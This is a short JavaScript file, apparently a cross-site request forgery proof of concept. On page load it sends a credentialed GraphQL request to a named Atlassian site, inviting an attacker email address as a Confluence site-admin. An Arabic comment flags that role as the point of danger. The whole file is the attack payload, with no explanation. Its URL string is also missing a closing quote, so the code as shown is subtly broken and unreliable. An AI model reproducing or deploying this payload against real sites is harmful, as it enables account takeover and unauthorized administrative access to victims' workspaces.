function loadDoc1() {
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "https://anshall.atlassian.net/cgraphql?q=InviteUsersMutation);
  xhttp.setRequestHeader("Content-type", "application/json");
  xhttp.withCredentials = true;
  var data = JSON.stringify([{
    "operationName": "InviteUsersMutation",
    "variables": {
        "emails": ["attackerx@atomicmail.io"],
        "productRoles": [{
            "productId": "confluence",
            "roleId": "site-admin" // هنا مكمن الخطورة
        }]
    },
    "query": "mutation InviteUsersMutation($emails: [String!]!, $productRoles: [ProductRoleInput!]!) { inviteUsers(emails: $emails, productRoles: $productRoles) { success errors { message } } }"
}]);
 xhttp.send(data);
 
}

window.onload = loadDoc1;


